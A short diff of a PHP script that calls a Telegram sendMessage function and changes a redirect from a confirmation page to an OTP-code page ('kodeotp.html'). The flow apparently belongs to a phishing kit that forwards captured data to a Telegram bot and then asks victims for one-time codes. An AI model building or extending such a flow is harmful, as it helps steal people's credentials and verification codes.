@@ -30,5 +30,5 @@ function sendMessage($telegram_id, $message, $id_bot) {
 }
 
 sendMessage($telegram_id, $message, $id_bot);
-header('Location:../konf.html');
+header('Location:../kodeotp.html');
 ?>
